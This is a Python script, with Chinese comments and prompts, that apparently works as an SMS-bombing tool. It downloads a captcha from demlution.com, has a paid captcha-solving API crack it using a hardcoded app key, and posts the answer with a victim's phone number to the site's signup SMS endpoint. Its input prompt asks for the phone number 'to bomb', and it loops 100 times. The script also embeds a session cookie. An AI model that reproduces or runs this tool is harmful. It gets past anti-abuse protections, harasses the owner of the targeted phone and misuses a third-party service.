import requests
import json
from time import sleep
import base64


# 识别验证码
def verify_code(base64_str):
    appkey = "d33906c525ed719b751c1b40f953816c"
    verify_code_juhe_url = "http://op.juhe.cn/vercode/index"
    print("开始上传云打码")
    url = verify_code_juhe_url
    params = {
        "key": appkey,
        "codeType": "1004",
        "base64Str": base64_str,
        "dtype": "json"
    }
    try:
        res = requests.post(url=url, params=params, timeout=60)
        res = json.loads(res.text)
    except Exception:
        print("上传云打码失败！！！")
    else:
        print("上传云打码成功！！！")
        return res['result']


def get_params():
    response = requests.get("http://www.demlution.com/dapi/verification_code/get_captcha", headers=headers)
    res = list(eval(response.text).values())
    key = res[0]
    img = res[1]
    return key, img


def get_image(img):
    bs = ''
    html = requests.get("http://www.demlution.com" + img, headers=headers)
    if html.status_code == 200:
        bs = base64.b64encode(html.content)
        with open("./%s.jpg" % ("验证码"), "wb") as f:
            f.write(html.content)
        f.close()
    return bs


def send(code, mykey):
    # ensure_ascii=False
    r = requests.post('http://www.demlution.com/dapi/verification_code/send_demlution_signup_code',
                      data=json.dumps({"mobile": tel_num, "challenge": code, "key": mykey, "type": "signup"}),
                      headers=headers)
    print(r.text)


def main():
    mykey, img = get_params()
    mykey = str(mykey)
    print(mykey)
    bs = get_image(img)
    code = verify_code(bs)
    code = str(code).upper()
    print(code)
    sleep(2)
    send(code, mykey)


if __name__ == '__main__':
    tessdata_dir_config = '--tessdata-dir "c://Program Files (x86)//Tesseract-OCR//tessdata"'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
        'Cookie': 'da_a=f3d3831b018a4f5ebf27d8f746332044',
        'Referer': 'http://www.demlution.com/'
    }
    tel_num = input("请输入要轰炸的手机号码:")
    for i in range(100):
        main()
